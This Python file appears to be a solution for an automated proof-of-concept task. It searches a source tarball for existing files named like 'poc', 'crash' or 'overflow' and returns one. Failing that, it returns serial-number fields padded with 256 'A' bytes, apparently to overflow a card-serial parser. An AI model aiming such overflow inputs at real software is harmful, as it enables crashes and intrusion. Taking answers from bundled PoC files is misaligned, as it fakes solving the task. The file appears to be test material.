import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()

                primary_tokens = ("poc", "crash", "overflow", "exploit", "bug", "fail", "id:", "id_")

                primary_candidates = []
                other_candidates = []

                for m in members:
                    if not m.isfile():
                        continue
                    size = m.size
                    if size == 0 or size > 5_000_000:
                        continue
                    name_lower = m.name.lower()
                    if any(tok in name_lower for tok in primary_tokens):
                        primary_candidates.append(m)
                    else:
                        other_candidates.append(m)

                def score_member(m: tarfile.TarInfo) -> float:
                    n = os.path.basename(m.name).lower()
                    size = m.size
                    score = 0.0

                    if "poc" in n:
                        score -= 80.0
                    if "crash" in n:
                        score -= 70.0
                    if "overflow" in n:
                        score -= 60.0
                    if "exploit" in n:
                        score -= 50.0
                    if "bug" in n:
                        score -= 40.0
                    if "fail" in n:
                        score -= 30.0
                    if "id:" in n or "id_" in n:
                        score -= 10.0

                    path_lower = m.name.lower()
                    if any(seg in path_lower for seg in ("/poc", "/pocs", "/crash", "/crashes", "/bugs", "/bug", "/tests")):
                        score -= 20.0

                    ext = ""
                    parts = n.rsplit(".", 1)
                    if len(parts) == 2:
                        ext = parts[1]

                    text_exts = {"txt", "md", "rst", "html", "xml", "csv", "log"}
                    source_exts = {
                        "c",
                        "cc",
                        "cpp",
                        "cxx",
                        "h",
                        "hpp",
                        "hh",
                        "java",
                        "py",
                        "rb",
                        "go",
                        "js",
                        "ts",
                        "php",
                        "sh",
                        "bat",
                        "ps1",
                    }
                    data_ok_exts = {"", "bin", "dat", "raw", "poc"}

                    if ext in source_exts:
                        score += 120.0
                    elif ext in text_exts:
                        score += 60.0
                    elif ext not in data_ok_exts:
                        score += 20.0

                    score += abs(size - 27) / 5.0
                    score += size / 10000.0

                    return score

                best_member = None
                best_score = None

                candidate_lists = [primary_candidates] if primary_candidates else [other_candidates]

                for cand_list in candidate_lists:
                    for m in cand_list:
                        s = score_member(m)
                        if best_score is None or s < best_score:
                            best_score = s
                            best_member = m

                if best_member is not None:
                    f = tf.extractfile(best_member)
                    if f is not None:
                        data = f.read()
                        if data:
                            return data
        except Exception:
            pass

        prefixes = [
            b"serialno=",
            b"serial=",
            b"serial:",
            b"card-serial=",
            b"card_serial=",
            b"card serial=",
            b"cardserial=",
            b"S2K:card:",
            b"s2k-card-serial=",
            b"S2K_SERIAL=",
        ]
        segments = []
        for p in prefixes:
            segments.append(p + (b"A" * 256) + b"\n")
        return b"".join(segments)
